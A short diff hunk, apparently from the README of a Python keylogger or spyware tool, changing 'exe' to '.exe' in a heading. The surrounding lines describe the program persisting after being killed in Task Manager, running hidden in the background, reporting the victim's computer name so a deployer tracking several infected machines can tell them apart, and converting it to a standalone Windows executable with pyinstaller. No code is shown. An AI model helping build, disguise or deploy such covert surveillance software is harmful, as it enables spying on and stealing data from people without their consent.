@@ -11,7 +11,7 @@ Even if the file is stopped from Task manager, it will pick up itself on next re
 The file completely runs in background.
 The file first sends you the name of victim's computer. So incase you have deployed it in multiple systems, you can know where the text is coming from.
 
-To change this code into exe file:
+To change this code into .exe file:
 
 .PY to .EXE - converting .py file to .exe( runs on any windows , doesn't require python)
 module required: pyinstaller. 
